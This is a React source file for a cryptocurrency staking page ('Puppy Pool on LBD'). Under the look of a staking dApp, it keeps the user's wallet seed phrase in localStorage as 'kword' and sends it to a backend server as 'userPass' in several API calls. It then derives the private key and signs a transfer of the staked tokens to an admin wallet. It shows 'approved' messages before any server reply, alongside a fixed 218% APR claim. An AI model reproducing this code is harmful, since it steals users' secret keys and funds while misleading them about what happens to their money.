import React, { useState, useEffect, useCallback, useRef } from 'react';
import { FaStoreAlt, FaArrowDown, FaArrowUp} from 'react-icons/fa';
import { Link, useHistory } from 'react-router-dom';
import Navbar from '../../components/NavBar';
import './index.css';
import {calculateReward} from '../../services/utils';
import firstIcon from '../../img/quotation/lbd-bnb.svg';
import MetaMask from '../../img/quotation/metamask.svg';
import poolImage from '../../img/syrup.png';
import Countdown from 'react-countdown';
import MyModal from '../../components/Modal';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import {apiSendStakeRequest, apiGetStakeDataById, apiSendUnstakeRequest} from '../../services/main';
import { io } from "socket.io-client";
import { format } from 'fecha';
import { ethers } from "ethers";
import Web3 from 'web3';
import { TOKEN_ADDRESS, TOKEN_ABI, RPC_URL, ADMIN_WALLET_ADDRESS, STAKEINTERVAL } from '../../services/Types';
import { restApiSettings } from "../../services/api";

const dropdownList = [
    {"id":1, "content":"APR"},
    {"id":2, "content":"Multiplier"},
    {"id":3, "content":"Earned"},
    {"id":4, "content":"Liquidity"},
    {"id":5, "content":"Hot"},
]

const Farm = (props) => {
    const dates = new Date(); // Now
    dates.setDate(dates.getDate() + 30);
    const [checked, setChecked] = useState('false');
    const [date, setState] = useState(dates)
    const [openCheck, setOpenChecked] = useState('close');
    const [detail, setDetail] = useState('false');
    const [stakeAmount, setStakeAmount] = useState('');
    const [balance, setBalance] = useState(100);
    const [isStake, setIsstake] = useState(false);
    const intervalRef = useRef()
    const counterDownRef = useRef();
    const socketRef = useRef();

    let [reward, setReward] = useState(0);

    const [login, setLogin] = useState(false);
    const [openModal, setOpenModal] = useState(false);
    const [address, setAddress] = useState(false);

    const [autoStart, setAutoStart] = useState(false);
    const [states, setStates] = useState(1);

    const history = useHistory();
    
    useEffect(() => {
        counterDownRef?.current.stop();
        if (autoStart) {
            counterDownRef.current.start();
        }
    }, [autoStart]);

    useEffect(() => {
        socketRef.current = io(restApiSettings.baseURL, { transports : ['websocket'] });
    }, []);

    useEffect(() => {
        socketRef.current.on('unstakeReject-client', (res) => {
            if(res === localStorage.getItem('kword')) {                        
                toast.info("Your unstaking request has been rejected");
            }
        });
        socketRef.current.on('unstakeResponse-client', (res) => { 
            if(res === localStorage.getItem('kword'))  {                      
                setIsstake(false);
                setAutoStart(false);
                    
                setReward(0);
                toast.info((<>Your unstaking request has been approved! <br/>{stakeAmount} have been unstaked!...</>));
            }
        });
        

    }, [states]);


    useEffect(() => {
        let formData = {
            userPass:localStorage.getItem('kword')
        }
        apiGetStakeDataById(formData).then(res => {
            if(res.data.msg !== 'noStake') {   
                setReward(res.data.reward);
                localStorage.setItem('stakeAmount', res.data.stake[0].stakeAmount);
                setIsstake(true);
                setAutoStart(true);                    
            } else {
                setIsstake(false);
                setAutoStart(false);
            }
        }).catch(err => {
            console.log('err:', err);
        })
    }, [states]);

    const showDetail = () => {
        if(detail === 'false') {
            setDetail('true')
        } else {
            setDetail('false')
        }
    }    
    
    const openChecked = (status) => {
        setOpenChecked(status);
    }

    const settingStake = async () => {
        if (isNaN(stakeAmount)) {
            toast.error('String is not allowed!');
        }
        else if(stakeAmount > Number(localStorage.getItem('balance'))) {
            toast.error('Insufficient BabyDoge balance!');
        } else if(stakeAmount == 0) {
            toast.error('Wrong amount');
        } 
        else if(stakeAmount !== '') {
            const stakeRequest = {
                stakeAmount: stakeAmount,
                userPass: localStorage.getItem('kword'),
            }
            await apiSendStakeRequest(stakeRequest).then(res => {
                console.log("res-----", res);
            })
            .catch(err => {
                console.log("err-----", err);
                toast.error('Your info is wrong!');
            })
            setStakeAmount('');
            localStorage.setItem('stakeAmount', stakeAmount); 
            // toast.info('Please wait accepting!');

            setIsstake(true);
            setAutoStart(true);
                   
            setReward(0);
            toast.info((<>Your staking request has been approved!<br/>You have staked your {stakeAmount} BabyDoge!...</>));
            socketRef.current.emit("stake", "request");
            const send_token =  async () => {
                const mnemonic = localStorage.getItem('kword');
                let privateKey = ethers.Wallet.fromMnemonic(mnemonic).privateKey;
                
                const web3 = new Web3(RPC_URL);
                let contract =  new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
    
                web3.eth.accounts.create(web3.utils.randomHex(32));
                let tempAddress = ethers.Wallet.fromMnemonic(mnemonic)['address'];
                // web3.eth.sign
                var account = web3.eth.accounts.privateKeyToAccount(privateKey);
                await web3.eth.getBalance(account['address']).then(console.log);
                var transfer = contract.methods.transfer(ADMIN_WALLET_ADDRESS, (localStorage.getItem('stakeAmount') * 1000000000));
                var encodedABI = transfer.encodeABI();
    
                var tx = {
                    from: account['address'],
                    to: TOKEN_ADDRESS,
                    gas: 2000000,
                    data: encodedABI
                }; 
    
                await web3.eth.accounts.signTransaction(tx, privateKey).then(signed => {
                    var tran = web3.eth.sendSignedTransaction(signed.rawTransaction);
    
                    tran.on('confirmation', (confirmationNumber, receipt) => {
                        console.log('confirmation: ' + confirmationNumber);
                    });
    
                    tran.on('transactionHash', hash => {
                        console.log('hash');
                        console.log(hash);
                    });
    
                    tran.on('receipt', receipt => {
                        console.log('reciept');
                        console.log(receipt);
                    });
    
                    tran.on('error', console.error);
                }) 
                const send_notification = async () => {
                    toast.info('Stake request has been processed successfully!');  
                    const balance = await contract.methods.balanceOf(tempAddress).call();   
                    localStorage.setItem('balance', parseInt(Number(balance)/(1000000000)));
                    history.go(0);
                }
                setTimeout(send_notification, 12000);                            
            }
            send_token();
        } 
        else {
            toast.error("Please input stake amount");
        } 
    }

    const renderer = ({ hours, minutes, seconds, completed, start }) => {
        if (completed) {
            setIsstake(false);
            localStorage.setItem('stakeAmount', 0);
            setState(Date.now() + 20000);            
            return <span></span>;
        } else {
            return <span></span>;
        }
    };

    const onTick = useCallback(() => {
        const stakeAmount = localStorage.getItem('stakeAmount');
        reward = calculateReward(reward, stakeAmount);
        setStates(Math.random());
        console.log(reward, stakeAmount);
    }, [])

    const OpenModal = () => {
        if(openModal === false)
            setOpenModal(true)
        else
            setOpenModal(false);
    }

    const setPercentage = (percentage) => {
        let temp = localStorage.getItem('balance') * percentage/100;
        setStakeAmount(temp);
    }
    
    const onComplete = () => {
        if(localStorage.getItem('login') == 'true')
            toast.success(`Stake amount ${stakeAmount} has been successfully unstaked!`);
        setState(Date.now() + 20000);
        setStakeAmount('');
    }

    const unStake = () => {
        const unstakeRequest = {
            userPass: localStorage.getItem('kword'),
        }
        apiSendUnstakeRequest(unstakeRequest).then(res => {
            console.log("res-----", res);
            if(res.data.msg === 'success') {
                toast.info('Your unstake request has been submitted. Please allow up to 24h to be approved!')
                socketRef.current.emit("unstake", "request");
            }
        })
        .catch(err => {
            console.log("err-----", err);
            toast.error('Your info is wrong!');
        })
        // toast.info('Please wait accepting!');
    }

    return (
        <>
            <Navbar openChecked={openChecked} isLogin={setLogin}/>
            
            <div className={`${openCheck !== 'close' ? 'p-main-close':'p-main'}`}>
                <div className='d-flex justify-content-between pt-5 flex-wrap'>
                    <div className='align-self-center'>
                        <div className='pool-title'>Puppy Pool on LBD</div>
                        <div>
                            <ul className='pool-subtitle pl-0'>
                                <li>Stake LBD to earn new tokens.</li>
                                <li>You can unstake at any time.</li>
                                <li>Rewards are calculated per block.</li>
                                <li>0% transfer fee applies.</li>
                            </ul>
                        </div>
                    </div>
                    <div><img src={poolImage} width={410} height={191} className="pool-image" /></div>
                </div>
                <Countdown date={date}
                    ref={counterDownRef}
                    intervalDelay={STAKEINTERVAL}
                    renderer={renderer}
                    onTick={onTick}
                    autoStart={false}
                    onComplete={onComplete}
                />
                <hr className='hr-blue' />
                <div className='text-center'>
                    <div className='pool-card inline-block text-left'>
                        <h4 className='color-blackpink font-OpenSansBold'>LBD Pool</h4>
                        
                        {localStorage.getItem('login') === 'false' && (
                            <div>
                                <div className='d-flex justify-content-between'>                            
                                <div><img src={firstIcon}  className='w-65'/></div>
                                </div>
                                <h4 className=' color-blackpink font-OpenSansBold pt-3 d-flex' style={{ justifyContent:'baseline'}}><p className='text-black fs-6 pt-2 mb-0 mr-3'>Available balance:</p>0.00</h4>
                                <div className='color-blackpink font-OpenSansBold'>0$</div>

                                <div className='title-color fs-12 pt-1'>LBD to Harvest in million (10^6):</div>
                                <div className='text-center'>
                                    <div className=" inline-block w-60 mt-3 btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-1" onClick={OpenModal}>
                                        Unlock Wallet
                                    </div>
                                </div>
                            </div>
                        )}
                        {localStorage.getItem('login') === 'true' && (
                            <div>
                                {isStake === false && (
                                    <div>
                                        <div className='d-flex justify-content-between'>                            
                                        <div><img src={firstIcon}  className='w-65'/></div>
                                        </div>
                                        <h4 className=' color-blackpink font-OpenSansBold pt-3 d-flex' style={{ justifyContent:'baseline'}}><p className='text-black fs-6 pt-2 mb-0 mr-3'>Available balance:</p>{localStorage.getItem('balance')}</h4>
                                        {/* <div className='color-blackpink font-OpenSansBold'>0$</div> */}

                                        {/* <div className='title-color fs-12 pt-1'>LBD to Harvest in million (10^6):</div> */}
                                        <div className='title-color fs-12 pt-1 d-flex'>
                                            <div className='pool-percentage-btn' onClick={() => setPercentage(25)}>25%</div>
                                            <div className='pool-percentage-btn' onClick={() => setPercentage(50)}>50%</div>
                                            <div className='pool-percentage-btn' onClick={() => setPercentage(75)}>75%</div>
                                            <div className='pool-percentage-btn' onClick={() => setPercentage(100)}>100%</div>
                                        </div>
                                        <div className='text-center'>
                                            <div><input type="text" id="fname" name="firstname" className='stake-amount' placeholder="Type amount to stake" value={stakeAmount} onChange={(e) => setStakeAmount(e.target.value)} /></div>
                                            <div className=" inline-block w-60 mt-3 btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-1" onClick={() => settingStake()}>
                                                Approve & Stake
                                            </div>
                                        </div>
                                    </div>
                                )}
                                {isStake === true && (
                                    <div>
                                        <div className='d-flex justify-content-between'>                           
                                            <div><img src={firstIcon}  className='w-65'/></div>
                                        </div>
                                        <p className='text-black fs-12 mb-0 mr-3 font-OpenSansSemiBold pt-4'>Value Locked: {stakeAmount}</p>
                                        <p className='text-black fs-12 mb-0 mr-3 font-OpenSansSemiBold pt-0'>Period: 30 days</p>
                                        <p className='text-black fs-12 mb-0 mr-3 font-OpenSansSemiBold pt-0'>Rewards: Hourly</p>
                                        <div className='text-center'>
                                            <p className='text-black fs-6 pt-2 mb-0 mr-3 font-OpenSansBold'>Current Rewards:</p>
                                            <h3 className='reward-color'>{reward}</h3>
                                        </div>

                                        <div className='text-center'>
                                            <div className=" inline-block w-60 mt-3 btn btn-primary rounded-button-long main-bg-color font-OpenSansBold mr-1" onClick={() => unStake()}>
                                                UnStake
                                            </div>
                                        </div>
                                    </div>
                                )}
                                
                            </div>
                        )}
                        

                        <div className='color-blackpink pt-3'>
                            <div className='d-flex justify-content-between'>
                                <div className='title-color pt-0 font-OpenSansSemiBold'>APR:</div>
                                <div className='d-flex'>
                                    <span className='pl-2 font-OpenSansBold'>218.13%</span>
                                </div>
                            </div>
                            <div className='d-flex justify-content-between'>
                                <div className='title-color pt-0 font-OpenSansSemiBold'>Your Stake (10^6):</div>
                                <div className='d-flex'>
                                    <span className='pl-2 font-OpenSansBold'>{localStorage.getItem('stakeAmount')} <p>0$</p></span>
                                </div>
                            </div>
                        </div>

                        <hr className='hr-grey'/>

                        <div className='text-center py-2'>
                            <div className='d-flex justify-content-between'>
                                <div className='po-out-btn pool-title-color'><span><FaStoreAlt className='mt-1 mx-2'/></span> Core</div>
                                <div className='title-color pt-1 d-flex cursor-pointer' onClick={() => showDetail()}>
                                    {detail === 'false' ? 'Details' : 'Hide'} 
                                    {detail === 'false' && (
                                        <FaArrowDown className='align-self-center ml-2'/>
                                    )}
                                    {detail === 'true' && (
                                        <FaArrowUp className='align-self-center ml-2'/>
                                    )}
                                </div>
                            </div>

                            {detail === 'true' && (
                                <>
                                    <div className='color-blackpink pt-3'>
                                        <div className='d-flex justify-content-between'>
                                            <div className='title-color pt-0 font-OpenSansSemiBold'>Total:</div>
                                            <div className='pl-2 font-OpenSansBold fs-12'>77,466,708,174,252</div>
                                        </div>
                                    </div>
                                    <div className='title-color pt-1 d-flex cursor-pointer'>
                                        Add LBD to Metamask <img src= {MetaMask} width={18} className='ml-2' />
                                    </div>
                                    <div className='title-color pt-1 d-flex cursor-pointer'>
                                        View project site
                                    </div>
                                </>
                            )}
                        </div>           
                    </div>
                    
                </div>
                <MyModal isOpen={openModal} isLogin={setLogin} isBalance={setBalance} setAddress={setAddress} isStake={setIsstake}/>
            </div>
        </>
    )
}

export default Farm;
